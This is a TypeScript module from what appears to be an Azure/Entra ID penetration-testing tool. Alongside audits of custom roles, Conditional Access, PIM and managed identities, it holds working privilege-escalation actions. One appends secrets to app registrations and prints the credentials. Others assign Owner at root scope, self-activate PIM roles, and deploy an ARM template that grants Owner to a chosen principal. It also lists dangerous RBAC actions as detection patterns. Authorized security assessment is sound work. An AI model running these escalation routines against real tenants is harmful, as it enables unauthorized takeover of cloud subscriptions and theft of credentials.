import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function entraPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method) return { output: "ERROR: --method required (consent_grant|sp_secret|role_assign)", findings: [] }
  const targetId = argVal(args, "--target-id")

  if (method === "sp_secret") {
    if (!targetId) return { output: "ERROR: --target-id (app object ID) required for sp_secret", findings: [] }
    const r = await run("az", ["ad", "app", "credential", "reset", "--id", targetId, "--append", "-o", "json"], timeout)
    if (r.exitCode === 0) {
      const cred = tryJson(r.stdout)
      return {
        output: `[+] Secret injected into app ${targetId}\n    appId: ${cred?.appId}\n    password: ${cred?.password}\n    tenant: ${cred?.tenant}`,
        findings: [],
      }
    }
    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "role_assign") {
    if (!targetId) return { output: "ERROR: --target-id (principal ID) required for role_assign", findings: [] }
    const r = await run(
      "az",
      ["role", "assignment", "create", "--assignee", targetId, "--role", "Owner", "--scope", "/", "-o", "json"],
      timeout,
    )
    if (r.exitCode === 0) return { output: `[+] Owner role assigned to ${targetId}`, findings: [] }
    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "consent_grant") {
    const apps = await run(
      "az",
      ["ad", "app", "list", "--query", "[].{id:id,name:displayName,appId:appId}", "-o", "json"],
      timeout,
    )
    if (apps.exitCode !== 0) return { output: `[-] Cannot list apps: ${apps.stderr.trim()}`, findings: [] }
    const al = tryJson(apps.stdout) || []
    return {
      output: [
        `[*] ${al.length} app registration(s) — review for consent grant targets:`,
        ...al.slice(0, 10).map((a: { name: string; appId: string }) => `    ${a.name} (${a.appId})`),
      ].join("\n"),
      findings: [],
    }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

export async function customRoleExploit(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing custom RBAC roles for dangerous permissions...\n"]

  const roles = await az(["role", "definition", "list", "--custom-role-only", "true"], sub, timeout)
  if (roles.exitCode !== 0) {
    return { output: output.join("\n") + `[-] Cannot list custom roles: ${roles.stderr.trim()}`, findings }
  }
  const roleList = tryJson(roles.stdout) || []
  output.push(`[+] Found ${roleList.length} custom role(s)\n`)

  const dangerous = [
    "*/write",
    "*/delete",
    "*",
    "Microsoft.Authorization/*",
    "Microsoft.Authorization/roleAssignments/write",
    "Microsoft.Authorization/roleDefinitions/write",
    "Microsoft.Resources/deployments/*",
    "Microsoft.Resources/deployments/write",
    "Microsoft.Compute/virtualMachines/runCommand/*",
    "Microsoft.Compute/virtualMachines/extensions/*",
    "Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action",
    "Microsoft.KeyVault/vaults/secrets/*",
    "Microsoft.Web/sites/publishxml/action",
    "Microsoft.Automation/automationAccounts/runbooks/draft/write",
  ]

  for (const role of roleList) {
    const name = role.roleName || role.name
    const permissions = role.permissions || []
    const scopes = role.assignableScopes || []
    const dangerousActions: string[] = []

    for (const perm of permissions) {
      for (const action of perm.actions || []) {
        const matched = dangerous.filter((d) => action === d || action.startsWith(d.replace("*", "")))
        dangerousActions.push(...matched.map((m) => `${action} (matches: ${m})`))
      }
    }

    if (dangerousActions.length > 0) {
      output.push(`[!] ${name}`)
      output.push(`    ID: ${role.id}`)
      output.push(`    Scopes: ${scopes.join(", ")}`)
      output.push(`    Dangerous actions:`)
      for (const a of dangerousActions) output.push(`      - ${a}`)

      const scopeLevel = scopes.some((s: string) => s === "/" || s.startsWith("/providers/Microsoft.Management"))
        ? "management-group/root"
        : scopes.some((s: string) => s.match(/^\/subscriptions\/[^/]+$/))
          ? "subscription"
          : "resource-group"

      findings.push({
        checkId: "AZ-ROLE-001",
        provider: "azure",
        severity: scopeLevel === "management-group/root" ? "critical" : "high",
        status: "FAIL",
        resource: `role://${role.id}`,
        title: `Custom role with dangerous permissions: ${name}`,
        details: `${dangerousActions.length} dangerous action(s), scope: ${scopeLevel}`,
        remediation: "Review and restrict custom role permissions to least privilege",
      })
    } else {
      output.push(`[+] ${name} — no dangerous permissions detected`)
    }
  }

  const assignments = await az(
    [
      "role",
      "assignment",
      "list",
      "--query",
      "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{principal:principalName,role:roleDefinitionName,scope:scope,type:principalType}",
    ],
    sub,
    timeout,
  )
  if (assignments.exitCode === 0) {
    const highPriv = tryJson(assignments.stdout) || []
    if (highPriv.length > 0) {
      output.push(`\n[*] High-privilege built-in role assignments:`)
      for (const a of highPriv) {
        output.push(`    ${a.principal} — ${a.role} (${a.type}) at ${a.scope}`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function conditionalAccessAudit(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing Conditional Access policies...\n"]

  const policies = await run(
    "az",
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies",
      "-o",
      "json",
    ],
    timeout,
  )
  if (policies.exitCode !== 0) {
    output.push(`[-] Cannot enumerate CA policies (need Policy.Read.All permission)`)
    output.push(`    Error: ${policies.stderr.trim().substring(0, 200)}`)
    output.push(`\n[*] Trying alternative — check named locations...`)
    const locations = await run(
      "az",
      [
        "rest",
        "--method",
        "GET",
        "--url",
        "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations",
        "-o",
        "json",
      ],
      timeout,
    )
    if (locations.exitCode === 0) {
      const locs = tryJson(locations.stdout)?.value || []
      output.push(`[+] Named locations: ${locs.length}`)
      for (const l of locs) {
        output.push(`    ${l.displayName} — trusted: ${l.isTrusted || false}`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  const policyList = tryJson(policies.stdout)?.value || tryJson(policies.stdout) || []
  output.push(`[+] Found ${policyList.length} Conditional Access policy/ies\n`)

  let hasGlobalMfa = false
  let hasLegacyBlock = false
  const excludedUsers = new Set<string>()
  const excludedGroups = new Set<string>()

  for (const p of policyList) {
    const state = p.state || "unknown"
    const icon = state === "enabled" ? "+" : state === "disabled" ? "!" : "~"
    output.push(`[${icon}] ${p.displayName} [${state}]`)

    const conditions = p.conditions || {}
    const grant = p.grantControls || {}
    const users = conditions.users || {}

    if (users.includeUsers?.includes("All") && grant.builtInControls?.includes("mfa")) hasGlobalMfa = true
    if (conditions.clientAppTypes?.includes("other") || conditions.clientAppTypes?.includes("exchangeActiveSync"))
      hasLegacyBlock = true

    for (const u of users.excludeUsers || []) excludedUsers.add(u)
    for (const g of users.excludeGroups || []) excludedGroups.add(g)

    const includeApps = conditions.applications?.includeApplications || []
    const excludeApps = conditions.applications?.excludeApplications || []
    output.push(
      `    Users: include=${JSON.stringify(users.includeUsers || []).substring(0, 80)}, exclude=${(users.excludeUsers || []).length}`,
    )
    output.push(
      `    Apps: include=${includeApps.length > 3 ? `${includeApps.length} apps` : JSON.stringify(includeApps)}, exclude=${excludeApps.length}`,
    )
    output.push(`    Grant: ${JSON.stringify(grant.builtInControls || [])}`)
    output.push(`    Client apps: ${JSON.stringify(conditions.clientAppTypes || [])}`)

    if (state === "disabled") {
      findings.push({
        checkId: "AZ-CA-001",
        provider: "azure",
        severity: "medium",
        status: "INFO",
        resource: `ca-policy://${p.id}`,
        title: `Disabled CA policy: ${p.displayName}`,
        details: "Disabled policies provide no protection — may be a security gap or leftover",
        remediation: "Review and either enable or delete disabled CA policies",
      })
    }

    if ((users.excludeUsers || []).length > 5) {
      findings.push({
        checkId: "AZ-CA-002",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: `ca-policy://${p.id}`,
        title: `Excessive user exclusions: ${p.displayName} (${users.excludeUsers.length} excluded)`,
        details: "Many excluded users may include service accounts or admins bypassing MFA",
        remediation: "Minimize CA policy exclusions, use dedicated break-glass accounts only",
      })
    }
  }

  output.push(`\n[*] Security posture summary:`)
  if (!hasGlobalMfa) {
    output.push(`    [!] No global MFA policy found (All Users + MFA required)`)
    findings.push({
      checkId: "AZ-CA-003",
      provider: "azure",
      severity: "critical",
      status: "FAIL",
      resource: "ca-policy://global",
      title: "No global MFA policy — users can authenticate without MFA",
      details: "No CA policy requires MFA for all users across all applications",
      remediation: "Create a CA policy: All Users → All Cloud Apps → Require MFA",
    })
  } else {
    output.push(`    [+] Global MFA policy found`)
  }

  if (!hasLegacyBlock) {
    output.push(`    [!] Legacy authentication not explicitly blocked`)
    findings.push({
      checkId: "AZ-CA-004",
      provider: "azure",
      severity: "high",
      status: "FAIL",
      resource: "ca-policy://legacy-auth",
      title: "Legacy authentication not blocked — MFA bypass possible",
      details: "Legacy protocols (IMAP, SMTP, POP3, ActiveSync) don't support MFA",
      remediation: "Create a CA policy blocking 'Other clients' and 'Exchange ActiveSync'",
    })
  } else {
    output.push(`    [+] Legacy authentication blocked`)
  }

  if (excludedUsers.size > 0) output.push(`    [*] Total unique excluded users: ${excludedUsers.size}`)
  if (excludedGroups.size > 0) output.push(`    [*] Total unique excluded groups: ${excludedGroups.size}`)

  return { output: output.join("\n"), findings }
}

export async function pimAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const roleId = argVal(args, "--role-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Analyzing Privileged Identity Management (PIM)...\n"]

  const eligible = await run(
    "az",
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances",
      "-o",
      "json",
    ],
    timeout,
  )
  if (eligible.exitCode !== 0) {
    output.push(`[-] Cannot query PIM (need RoleEligibilitySchedule.Read.Directory)`)
    output.push(`    Error: ${eligible.stderr.trim().substring(0, 200)}`)

    output.push(`\n[*] Trying alternative — list directory role assignments...`)
    const roles = await run(
      "az",
      ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/directoryRoles", "-o", "json"],
      timeout,
    )
    if (roles.exitCode === 0) {
      const roleList = tryJson(roles.stdout)?.value || []
      output.push(`[+] Active directory roles: ${roleList.length}`)
      for (const r of roleList) {
        output.push(`    ${r.displayName} (${r.id})`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  const eligibleList = tryJson(eligible.stdout)?.value || []
  output.push(`[+] Eligible role assignments: ${eligibleList.length}\n`)

  const adminRoles = [
    "Global Administrator",
    "Privileged Role Administrator",
    "Security Administrator",
    "Exchange Administrator",
    "User Administrator",
  ]

  for (const e of eligibleList) {
    const roleName = e.roleDefinition?.displayName || e.roleDefinitionId || "unknown"
    const principal = e.principal?.displayName || e.principalId || "unknown"
    const isAdmin = adminRoles.some((r) => roleName.includes(r))

    output.push(`[${isAdmin ? "!" : "+"}] ${principal} → ${roleName}`)
    output.push(`    Start: ${e.startDateTime || "N/A"}, End: ${e.endDateTime || "permanent"}`)
    output.push(`    Status: ${e.assignmentType || "eligible"}`)
    output.push(`    Scope: ${e.directoryScopeId || "/"}`)

    if (isAdmin) {
      findings.push({
        checkId: "AZ-PIM-001",
        provider: "azure",
        severity: "high",
        status: "ENUMERATED",
        resource: `pim://${e.principalId}/${e.roleDefinitionId}`,
        title: `PIM eligible admin role: ${principal} → ${roleName}`,
        details: `Eligible for activation — check if approval required`,
        remediation: "Require approval and justification for admin role activation",
      })
    }
  }

  const settings = await run(
    "az",
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/policies/roleManagementPolicies",
      "-o",
      "json",
    ],
    timeout,
  )
  if (settings.exitCode === 0) {
    const policies = tryJson(settings.stdout)?.value || []
    output.push(`\n[*] PIM activation policies: ${policies.length}`)
    for (const p of policies.slice(0, 10)) {
      const rules = p.rules || []
      const approvalRule = rules.find(
        (r: Record<string, string>) => r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyApprovalRule",
      )
      const mfaRule = rules.find(
        (r: Record<string, string>) =>
          r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyAuthenticationContextRule",
      )
      if (approvalRule) {
        const needsApproval = approvalRule.setting?.isApprovalRequired
        if (!needsApproval) {
          output.push(`    [!] ${p.displayName || p.id}: NO APPROVAL required`)
          findings.push({
            checkId: "AZ-PIM-002",
            provider: "azure",
            severity: "critical",
            status: "FAIL",
            resource: `pim-policy://${p.id}`,
            title: `PIM role activation without approval: ${p.displayName || p.id}`,
            details: "Role can be self-activated without manager/admin approval",
            remediation: "Enable approval requirement in PIM role settings",
          })
        }
      }
    }
  }

  if (action === "activate" && roleId) {
    output.push(`\n[*] Attempting to activate role: ${roleId}`)
    const activate = await run(
      "az",
      [
        "rest",
        "--method",
        "POST",
        "--url",
        "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests",
        "--body",
        JSON.stringify({
          action: "selfActivate",
          roleDefinitionId: roleId,
          directoryScopeId: "/",
          justification: "Security assessment",
          scheduleInfo: {
            startDateTime: new Date().toISOString(),
            expiration: { type: "afterDuration", duration: "PT1H" },
          },
        }),
        "-o",
        "json",
      ],
      timeout,
    )
    if (activate.exitCode === 0) {
      output.push(`[+] Role activation request submitted!`)
      const result = tryJson(activate.stdout)
      output.push(`    Status: ${result?.status || "pending"}`)
      findings.push({
        checkId: "AZ-PIM-003",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `pim://activate/${roleId}`,
        title: "PIM role activated via self-activation",
        details: `Role ${roleId} activated for 1 hour`,
        remediation: "Revoke activation, require approval for future activations",
      })
    } else {
      output.push(`[-] Activation failed: ${activate.stderr.trim().substring(0, 200)}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function managedIdentityPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Analyzing managed identity RBAC assignments...\n"]

  const identities = await az(
    [
      "identity",
      "list",
      "--query",
      "[].{name:name,rg:resourceGroup,principalId:principalId,clientId:clientId,type:type}",
    ],
    sub,
    timeout,
  )
  if (identities.exitCode !== 0) {
    output.push(`[-] Cannot list user-assigned identities: ${identities.stderr.trim().substring(0, 200)}`)
    output.push(`\n[*] Falling back to resource-level identity check...`)
  } else {
    const idList = tryJson(identities.stdout) || []
    output.push(`[+] User-assigned managed identities: ${idList.length}`)
    for (const id of idList) {
      output.push(`    ${id.name} (${id.rg}) — principalId: ${id.principalId}`)
    }
  }

  const assignments = await az(
    [
      "role",
      "assignment",
      "list",
      "--all",
      "--query",
      "[?principalType=='ServicePrincipal'].{principal:principalName,role:roleDefinitionName,scope:scope,principalId:principalId}",
    ],
    sub,
    timeout,
  )
  if (assignments.exitCode !== 0) {
    return { output: output.join("\n") + `\n[-] Cannot list role assignments: ${assignments.stderr.trim()}`, findings }
  }
  const spAssignments = tryJson(assignments.stdout) || []
  output.push(`\n[+] Service principal role assignments: ${spAssignments.length}`)

  const highPrivRoles = [
    "Owner",
    "Contributor",
    "User Access Administrator",
    "Virtual Machine Contributor",
    "Key Vault Administrator",
  ]
  const overPrivileged: Record<string, string[]> = {}

  for (const a of spAssignments) {
    if (!highPrivRoles.includes(a.role)) continue
    const key = a.principalId || a.principal
    if (!overPrivileged[key]) overPrivileged[key] = []
    overPrivileged[key].push(`${a.role} at ${a.scope}`)
  }

  if (Object.keys(overPrivileged).length > 0) {
    output.push(`\n[!] Over-privileged managed identities/service principals:`)
    for (const [principal, roles] of Object.entries(overPrivileged)) {
      output.push(`\n    ${principal}:`)
      for (const r of roles) output.push(`      - ${r}`)
      findings.push({
        checkId: "AZ-MI-001",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: `identity://${principal}`,
        title: `Over-privileged identity: ${roles.length} high-priv role(s)`,
        details: roles.join("; "),
        remediation: "Apply least-privilege — replace broad roles with specific resource-scoped roles",
      })
    }
  }

  const vms = await az(
    [
      "vm",
      "list",
      "--query",
      "[?identity].{name:name,rg:resourceGroup,identityType:identity.type,principalId:identity.principalId,userAssigned:identity.userAssignedIdentities}",
    ],
    sub,
    timeout,
  )
  if (vms.exitCode === 0) {
    const vmList = (tryJson(vms.stdout) || []).filter((v: Record<string, string>) => v.identityType)
    if (vmList.length > 0) {
      output.push(`\n[*] VMs with managed identity:`)
      for (const vm of vmList) {
        output.push(`    ${vm.name} (${vm.rg}) — ${vm.identityType}, principalId: ${vm.principalId || "N/A"}`)
        if (vm.principalId && overPrivileged[vm.principalId]) {
          output.push(`    [!] This VM's identity has high-privilege roles — compromise this VM = escalation`)
          findings.push({
            checkId: "AZ-MI-002",
            provider: "azure",
            severity: "critical",
            status: "FAIL",
            resource: `vm://${vm.name}`,
            title: `VM with over-privileged managed identity: ${vm.name}`,
            details: `Identity has: ${overPrivileged[vm.principalId].join("; ")}`,
            remediation: "Reduce identity permissions or remove identity from this VM",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function deploymentPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "check"
  const targetPrincipal = argVal(args, "--principal-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Checking ARM deployment privilege escalation vectors...\n"]

  const whoami = await az(["account", "show"], sub, timeout)
  if (whoami.exitCode !== 0) {
    return { output: output.join("\n") + `[-] Cannot determine current identity: ${whoami.stderr.trim()}`, findings }
  }
  const acct = tryJson(whoami.stdout)
  output.push(`[+] Current identity: ${acct?.user?.name} (${acct?.user?.type})`)
  output.push(`    Subscription: ${acct?.name} (${acct?.id})`)

  const perms = await az(
    [
      "role",
      "assignment",
      "list",
      "--assignee",
      acct?.user?.name || "",
      "--query",
      "[].{role:roleDefinitionName,scope:scope}",
    ],
    sub,
    timeout,
  )
  if (perms.exitCode === 0) {
    const permList = tryJson(perms.stdout) || []
    output.push(`\n[+] Current role assignments:`)
    for (const p of permList) output.push(`    ${p.role} at ${p.scope}`)

    const canDeploy = permList.some(
      (p: Record<string, string>) =>
        ["Owner", "Contributor"].includes(p.role) ||
        p.role === "Template Spec Contributor" ||
        p.role === "Resource Policy Contributor",
    )

    if (canDeploy) {
      output.push(`\n[!] Current identity CAN deploy ARM templates — privesc possible`)
      findings.push({
        checkId: "AZ-DEPLOY-001",
        provider: "azure",
        severity: "critical",
        status: "FAIL",
        resource: `deployment://${acct?.id}`,
        title: "ARM template deployment privilege escalation possible",
        details: "Current identity can deploy ARM templates that create role assignments",
        remediation: "Use deny assignments to block Microsoft.Authorization/roleAssignments/write",
      })

      output.push(`\n[*] Exploit ARM template (creates Owner role assignment):`)
      const template = {
        $schema: "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
        contentVersion: "1.0.0.0",
        parameters: {
          principalId: { type: "string" },
          roleDefinitionId: { type: "string", defaultValue: "8e3af657-a8ff-443c-a75c-2fe8c4bcb635" },
        },
        resources: [
          {
            type: "Microsoft.Authorization/roleAssignments",
            apiVersion: "2022-04-01",
            name: "[guid(parameters('principalId'), parameters('roleDefinitionId'))]",
            properties: {
              roleDefinitionId:
                "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions', parameters('roleDefinitionId'))]",
              principalId: "[parameters('principalId')]",
              principalType: "ServicePrincipal",
            },
          },
        ],
      }
      output.push(`\n${JSON.stringify(template, null, 2)}`)

      if (action === "exploit" && targetPrincipal) {
        output.push(`\n[*] Deploying exploit template for principal: ${targetPrincipal}`)
        const tmpFile = `/tmp/cs-arm-privesc-${Date.now()}.json`
        await Bun.write(tmpFile, JSON.stringify(template))
        try {
          const deploy = await run(
            "az",
            [
              "deployment",
              "sub",
              "create",
              "--location",
              "eastus",
              "--template-file",
              tmpFile,
              "--parameters",
              `principalId=${targetPrincipal}`,
              "-o",
              "json",
            ],
            timeout,
          )
          if (deploy.exitCode === 0) {
            output.push(`[+] Deployment succeeded — Owner role assigned to ${targetPrincipal}`)
            findings.push({
              checkId: "AZ-DEPLOY-002",
              provider: "azure",
              severity: "critical",
              status: "EXPLOITED",
              resource: `deployment://privesc/${targetPrincipal}`,
              title: "ARM template privesc exploited — Owner role assigned",
              details: `Principal ${targetPrincipal} now has Owner on subscription`,
              remediation: `Remove: az role assignment delete --assignee ${targetPrincipal} --role Owner`,
            })
          } else {
            output.push(`[-] Deployment failed: ${deploy.stderr.trim().substring(0, 300)}`)
          }
        } finally {
          try {
            ;(await Bun.file(tmpFile).exists()) && (await run("rm", ["-f", tmpFile], 5))
          } catch {}
        }
      }
    } else {
      output.push(`\n[+] Current identity cannot deploy ARM templates — no direct privesc via this path`)
    }
  }

  return { output: output.join("\n"), findings }
}
